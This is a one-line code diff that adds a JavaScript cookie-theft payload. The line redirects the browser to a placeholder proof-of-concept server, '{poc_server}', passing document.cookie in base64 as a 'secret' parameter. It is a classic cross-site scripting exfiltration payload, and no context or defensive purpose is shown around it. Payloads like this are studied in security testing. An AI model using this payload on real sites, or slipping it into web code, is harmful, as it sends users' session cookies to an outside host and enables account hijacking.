@@ -1,0 +1,1 @@
+location.href="{poc_server}?secret=" + btoa(document.cookie);
